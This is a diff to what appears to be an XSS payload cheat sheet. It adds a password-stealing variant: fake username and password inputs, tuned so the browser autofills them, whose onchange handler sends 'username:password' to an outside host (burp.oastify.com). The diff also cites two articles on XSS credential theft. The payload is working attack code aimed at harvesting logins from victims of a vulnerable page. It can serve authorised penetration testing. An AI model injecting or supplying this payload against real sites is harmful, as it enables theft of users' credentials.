@@ -154,6 +154,17 @@ mode: 'no-cors',
 body:username.value+':'+this.value
 });">
 ```
+>If you want them to be autocompleted
+```
+<input name="username" id="username" autocomplete="username">
+<input type="password" id=”password” name="password" autocomplete="password" onchange="if(this.value.length)fetch('http://burp.oastify.com',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+```
+
+
 >https://www.doyler.net/security-not-included/xss-password-stealing  
 >https://medium.com/dark-roast-security/password-stealing-from-https-login-page-and-csrf-bypass-with-reflected-xss-76f56ebc4516
 
